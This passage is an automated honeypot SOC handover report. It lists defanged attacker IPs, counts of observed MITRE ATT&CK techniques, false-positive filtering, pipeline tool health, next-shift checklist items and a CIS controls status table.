| `111.36.57[.]69` | CN | China Mobile Communications Corporation | **100** ⚠️ | 48 |
| `120.234.232[.]184` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `60.174.39[.]82` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 175 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 158 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 37 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 36 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 36 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 267 cases |
| Tool 34  | Credential Extractor        | ✅ 200 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 132 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (13.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 76 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 155 priority case(s) shown individually · 39 recon entry/entries in table (11 group(s) consolidating 48 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-26T13:38:26Z_
